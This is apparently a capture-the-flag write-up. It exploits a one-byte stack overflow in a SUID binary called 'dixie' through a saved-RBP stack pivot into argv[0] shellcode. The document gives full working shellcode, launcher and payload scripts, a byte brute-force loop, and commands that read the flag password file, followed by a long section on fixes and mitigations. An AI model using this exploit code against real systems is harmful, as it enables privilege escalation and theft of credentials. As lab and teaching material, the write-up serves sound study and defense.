# Rainfall — Level 2: Off-By-One / Stack Pivot (`dixie`)

**Target:** `dixie` — SUID `flag02` binary, x86-64 Linux
**Goal:** Read `/home/flag02/.pass`
**Technique:** Single-byte overflow into saved RBP LSB → `leave; ret` stack pivot →
`ret` fetches RIP from a buffer slot pre-filled with a pointer to shellcode stored
in `argv[0]` (RWX stack)

---

## 1. Reconnaissance

```bash
ls -la                     # -rwsr-x---  1 flag02 level02 dixie
checksec --file=./dixie
nm ./dixie | grep -E " t | T "
```

```
RELRO           STACK CANARY      NX                       PIE
Partial RELRO   No canary found   NX unknown (GNU_STACK    No PIE (0x400000)
                                  missing) — Stack: Executable, RWX segments
```

| Finding | Meaning |
|---|---|
| **No canary** | Nothing between buffer and saved RBP; overwrite undetected |
| **RWX stack** | Code placed on the stack executes (shellcode viable) |
| **No PIE** | Binary code at fixed addresses — *not needed this level, see §8* |
| **SUID flag02** | Injected code inherits `euid=flag02` — win condition |
| **No win function** | `nm` shows no hidden privileged function (contrast level 1) — the payload must be brought in from outside |

## 2. The bug

```c
char buf[BUF_SIZE];                 // 64 bytes

while (in_len <= BUF_SIZE) {        // 0..64 INCLUSIVE = 65 iterations
    in_ch = read(0, &buf[in_len], 1);
    if (in_ch <= 0)
        break;
    in_len++;
}
```

`<=` instead of `<`: exactly **one byte** past the buffer. Disassembly confirms:

```asm
401434:  lea  rdx,[rbp-0x40]     ; &buf[in_len]  → buf at rbp-0x40
401476:  cmp  rax,0x40
40147a:  jbe  40142d             ; loop while in_len <= 64
```

Stack layout of `store_record` (only local, no padding — confirmed by source comment
and disassembly):

```
buf[0..63]   rbp-0x40 .. rbp-0x01   ← bytes 0..63  (controlled)
buf[64]      rbp+0x00               ← byte  64     = LSB of SAVED RBP  ★ only write
saved RIP    rbp+0x08               ← byte  72     UNREACHABLE
```

## 3. The primitive: what one byte into saved RBP buys

`main` ends with (verified in disassembly):

```asm
40159a:  leave     ; rsp = rbp ; pop rbp     ← rsp DERIVED FROM corrupted rbp
40159b:  ret       ; rip = [rsp] ; rsp += 8  ← next RIP fetched from attacker-chosen slot
```

`store_record`'s own epilogue pops the corrupted value into the RBP **register**;
`main` then derives RSP from it. One byte = 256 possible values of `C`:

```
after leave:   rsp = C        (C = M with low byte replaced by B)
after pop:     rsp = C + 8
ret:           rip = [C + 8]
```

Constraint: `C ^ M < 0x100` (only the low byte differs from M's true value).

The corrupted RBP also has a visible side effect: main's last `printf` reads
`session` via `lea rax,[rbp-0x10]` — with a poisoned RBP register the
"session closed" line prints **garbage**. That line is in-band proof the
corruption took effect.

## 4. Dead ends — and the clue each one produced

These are documented because each failure narrowed the path.

**4.1 Pivot directly to the `&argv[0]` slot — arithmetic impossibility.**
Plan: corrupt LSB so that `C + 8 = S` (slot holding a pointer to the argv[0]
string). Measurements (gdb, break at `store_record`'s leave `0x4014a1`,
launching via a fixed-geometry wrapper — see §5):

```
M = 0x7fffffffece0   (main's true RBP; recovered from main's frame:
                      "dixie" string found at 0x7fffffffecd0 = M-0x10)
S = 0x7fffffffee08   (&argv[0] slot; landmark: argc=1 at 0x7fffffffee00,
                      followed by 0x00007fffffffefb9, then NULL)
```

Needed `C = S - 8 = 0x7fffffffee00`. Gap = `S - 8 - M = 0x120` — but the byte
can only move RBP inside one 256-byte window (reachable span above M: 0x1F).
**Fail.** Additional finding: adding environment/argv padding does NOT shrink
the gap — `main`'s frame distance from the argv block is fixed by libc startup
code (`__libc_start_main` frames), not by input layout.

Clue produced: the region between M and S contains only stack-internal values;
every reachable qword that pointed at `0x7fffffffee08` was examined and
rejected — jumping into the **argv pointer array** (as opposed to the argv
**string**) executes the bytes of `argc`/pointers as code (`mov ecx,…; jg …`)
and crashes. The argv *string* is the only executable-controlled-content zone.

**4.2 "printf's dead frame recycles the whole buffer" — falsified by experiment.**
The pivot happens after `dump_records()` and `printf()` have run, so the
planted buffer was assumed overwritten by their frames. A **marker payload**
(32×`A`, 32×`B`, byte `0x00`) was dumped at the crash:

```
0x7fffffffec80: 0x4141414141414141  ×4    ← buf[0..31]  SURVIVED
0x7fffffffeca0: 0x00007fffffffecc0        ← vfprintf spill (corpse)
0x7fffffffeca8: 0x000000000040152c        ← corpse
0x7fffffffecb0: 0x4242424242424242        ← buf[48..55] SURVIVED
0x7fffffffecb8: 0x0000000142424242        ← half ours / half corpse
0x7fffffffecC0: 0x00007fffffffec00        ← corrupted saved RBP (byte 0x00) ✓
```

Clue produced: the corpse is **sparse**, not a wall — `buf[0..31]` and
`buf[48..55]` are intact at the exact moment of `main`'s `ret`. Buffer
contents survive → pointers planted in the buffer can be the target of the pivot.

**4.3 Dummy-byte crash is not a failure.** With filler bytes, SIGSEGV at
`0x40159b` (main's `ret`) is the expected result of `ret` reading a stale
misaligned qword. The same run produced the ground-truth check:
byte `0x00` → at crash, `rsp = 0x7fffffffec08` = `C+8` with
`C = 0x7fffffffeC00|0x00` — formula verified against live registers.

**4.4 Operational errors (each cost one run):**

- Breakpoint `0x40149d` was a **placeholder that is not an instruction
  boundary** (second byte of `call commit_record` at `0x40149c`). Breakpoints
  must come from your own objdump listing. Correct addresses in this build:
  `0x4014a1` (store_record's `leave`), `0x40159a`/`0x40159b` (main's `leave`/`ret`).
- `assert len(sc) == 41` while the shellcode was 42 bytes → the exec-wrapper
  died at startup → gdb printed "No registers". Lesson: when gdb says
  "No registers", check the wrapper's traceback first — the process never
  started. (Length assertion removed; only the NUL-free assertion is load-bearing.)
- `run < /tmp/marker` before creating `/tmp/marker` — same class as the
  level-0 `/tmp/pwn` incident: file referenced before creation.

## 5. Launcher — shellcode as argv[0]

Strings cannot contain NUL bytes, so the shellcode must be **NUL-free**
(zeros built at runtime by pushes). It runs `execve("/bin/sh", ["/bin/sh","-p"], NULL)`
— `-p` prevents dash from dropping the SUID euid (level-0 lesson).

The same script launches both gdb and the real run → identical stack geometry.

```bash
cat > /tmp/launch.py <<'EOF'
#!/usr/bin/env python3
import os, sys
sc = bytes.fromhex(
    "31f656"                     # xor esi,esi ; push rsi          (NUL)
    "48bb2f62696e2f2f7368"       # movabs rbx,"/bin//sh"          (no NUL)
    "53"                         # push rbx                       (path)
    "545f"                       # push rsp ; pop rdi             (rdi = path)
    "31c0"                       # xor eax,eax
    "66b82d70"                   # mov ax,"-p"
    "50"                         # push rax                       ("-p" string)
    "56"                         # push rsi                       (NULL)
    "488d442408"                 # lea rax,[rsp+8]                (&"-p")
    "50"                         # push rax                       (argv[1])
    "57"                         # push rdi                       (argv[0])
    "4889e6"                     # mov rsi,rsp                    (argv)
    "31d2"                       # xor edx,edx                    (envp=NULL)
    "31c0b03b"                   # xor eax,eax ; mov al,59
    "0f05"                       # syscall
)
assert b"\x00" not in sc, "NUL in shellcode!"
print(f"[*] launcher: shellcode {len(sc)} bytes, argv[0] set", file=sys.stderr)
os.execve("/home/level02/dixie", [sc], {})
EOF
chmod +x /tmp/launch.py
echo | python3 /tmp/launch.py        # smoke test: banner + clean exit
```

## 6. Measurements (gdb, deterministic — no ASLR)

```bash
printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > /tmp/o2  # 65×'A'
gdb -nx -q ./dixie
```
```
(gdb) set exec-wrapper python3 /tmp/launch.py
(gdb) break *0x4014a1          # store_record's leave — from YOUR objdump
(gdb) run < /tmp/o2
(gdb) x/gx $rbp                # saved RBP slot (low byte shows 0x41)
(gdb) x/60gx $rbp              # walk UP: saved RBP → 0x401575 → main frame
                               # → libc frames → argc=1 → &argv[0] → NULL
```

Results in this environment:

| Symbol | Value | How obtained |
|---|---|---|
| M (main's RBP) | `0x7fffffffece0` | "dixie" at `M-0x10` in dump |
| S (`&argv[0]` slot) | `0x7fffffffee08` | after argc landmark `0x...ee00` |
| argv[0] string addr (SC_ADDR) | `0x7fffffffefb9` | `x/gx 0x7fffffffee08` |
| buffer span | `0x7fffffffec80–0x7fffffffecbf` | marker dump (A-zone/B-zone) |

## 7. Final exploit — flood the buffer with pointers, pick a survivor

Fill all 64 buffer bytes with `SC_ADDR` (8 identical qwords). Then almost any
pivot byte that lands `C+8` inside `buf` returns into the shellcode.

```bash
python3 - <<'EOF'
import struct
SC_ADDR = 0x7fffffffefb9        # measured: value at &argv[0] slot
payload  = struct.pack("<Q", SC_ADDR) * 8    # 64 bytes, every qword = &shellcode
payload += bytes([0x78])                     # saved RBP LSB → C = 0x7fffffffec78
payload += b"\nid\ncat /home/flag02/.pass\n" # leftover pipe → spawned sh executes
open("/tmp/o2","wb").write(payload)
print("[+] payload written")
EOF
```

Byte arithmetic: `C = 0x7fffffffeC00 | 0x78 = 0x7fffffffec78`;
`C ^ M = 0xe0 ^ 0x78 = 0x98 < 0x100` ✓; `C+8 = 0x7fffffffec80` = `buf[0..7]`.

Execution trace at the end of `main`:

```
leave:  rsp = 0x7fffffffec78        (rbp register had LSB 0x78)
pop:    rbp = garbage (a pointer copy — never dereferenced)
ret:    rip = [0x7fffffffec80] = 0x7fffffffefb9 → argv[0] string (RWX)
        → 42 bytes of NUL-free shellcode → execve("/bin/sh", ["/bin/sh","-p"])
```

Fire:

```bash
python3 /tmp/launch.py < /tmp/o2
```

Output sequence: banner → `Record 0 stored` → dump line truncated after a few
bytes (`%.64s` stops at the first NUL of the first pointer — in-band sign the
pointer-flood is in place) → session-closed line reads through poisoned RBP →
`id` shows `euid=flag02` → `.pass` printed by the piped commands.

Backup search (if the chosen byte ever misses): sweep all 256 values, the
pointer-flood makes many of them valid:

```bash
python3 - <<'EOF'
import subprocess, struct
for B in range(256):
    p = struct.pack("<Q", 0x7fffffffefb9)*8 + bytes([B]) + b"\necho PWNED\n"
    try:
        r = subprocess.run(["python3","/tmp/launch.py"], input=p,
                           capture_output=True, timeout=3)
        if b"PWNED" in r.stdout: print("[!!!] byte", hex(B))
    except subprocess.TimeoutExpired: pass
EOF
```

## 8. Attack chain summary

```
1. checksec/nm        → RWX stack, no canary, no win function → bring own shellcode
2. disassembly        → buf at rbp-0x40; loop bound <= → byte 64 hits saved RBP LSB
3. primitive          → main's leave;ret derives RSP from RBP → 256-byte pivot window
4. geometry measured  → M=0x7fffffffece0, S=0x7fffffffee08, gap 0x120 → direct pivot impossible
5. argv[0] chosen     → attacker-controlled string, RWX, NUL-free shellcode (42 B)
6. marker experiment  → buf[0..31] and buf[48..55] survive printf corpse
7. pointer flood      → 64 bytes = SC_ADDR×8; pivot byte 0x78 → ret pops &shellcode
8. sh -p              → keeps euid=flag02 → cat /home/flag02/.pass
```

Note: no binary address is used anywhere in the exploit (PIE would not have
stopped it). The exploit uses only stack addresses and one buffer byte.

---

## 9. How to protect against this

### 9.1 Fix the source (the actual bug)

```c
while (in_len < BUF_SIZE) {          /* < , not <= */
    in_ch = read(0, &buf[in_len], 1);
    if (in_ch <= 0) break;
    in_len++;
}
```

One character. Better still, avoid the manual loop entirely and bound the
syscall: `ssize_t n = read(0, buf, sizeof(buf));` — the size passed to a read
must always be the *destination* size, never destination+1, never a constant
defined elsewhere.

### 9.2 Stack canary — and why it catches THIS overflow

With `-fstack-protector-all` the compiler reorders locals: arrays are placed
**directly below the canary**. The layout becomes `buf` at `rbp-0x48`, canary
at `rbp-0x8` — so `buf[64]` no longer lands on saved RBP; it lands on the
canary's low byte. `__stack_chk_fail` aborts before any epilogue, and the
pivot never happens. Subtlety worth stating precisely: without the canary the
65th byte hits saved RBP (canary slot occupied); the protection works by
*displacing the blast radius onto itself*.

### 9.3 NX / W^X

The pivot itself is a control-flow operation — NX cannot stop `rsp = rbp`.
What NX stops is the payload: `argv[0]` shellcode on the stack becomes
non-executable and the chain dies at the final hop. Building with
`-Wl,-z,noexecstack` (and a system-wide W^X policy) prevents the
"GNU_STACK missing → RWX fallback" this binary shipped with. NX converts this
attack from "one byte + flood" to a much harder ROP problem.

### 9.4 ASLR

Every address in the working exploit is a stack address (`SC_ADDR`,
the 256-byte window). With stack randomization the attacker cannot know where
argv[0] lands, cannot plant a valid pointer, and cannot predict which `C` is
safe. ASLR + NX together close this level completely.

### 9.5 What would NOT have stopped it

- **PIE**: no binary address is referenced (contrast levels 0–1). A reminder
  that each protection covers specific techniques; checksec rows are not a score.
- **Full RELRO / FORTIFY**: no function pointers, GOT, or libc functions abused.
- A canary *only in some functions*: the corruption happens in `store_record`
  but is *consumed* in `main`'s epilogue — protection must cover both frames.

### 9.6 Detection in development

- AddressSanitizer (`-fsanitize=address`): the 65th write is a
  stack-buffer-overflow report in testing.
- Compiler: `-Waggressive-loop-optimizations` flags suspicious loop bounds;
  UBSan and static analyzers (clang scan-build, CodeChecker) flag `<=` on a
  size-indexed loop.
- Review rule: any loop indexing a buffer must read `i < sizeof(buffer)`;
  `<=` on a buffer index is a defect by definition.

### 9.7 Mapping defenses to attack steps

```
Attack step                              Defense that stops it
───────────────────────────────────────  ─────────────────────────────────
65th byte written past buf[63]           loop bound <  / ASan          → no overflow at all
byte lands on saved RBP LSB              stack canary (layout shift)   → detected, abort
leave derives rsp from corrupted rbp     (canary) — never reached
ret pops pointer from flooded buffer     ASLR                          → pointer unknowable
execute shellcode in argv[0] string      NX / W^X                      → data cannot run
keep euid via sh -p                      no SUID / drop privs early    → nothing to steal
read the flag                            file permissions (.pass)      → last line of defense
```
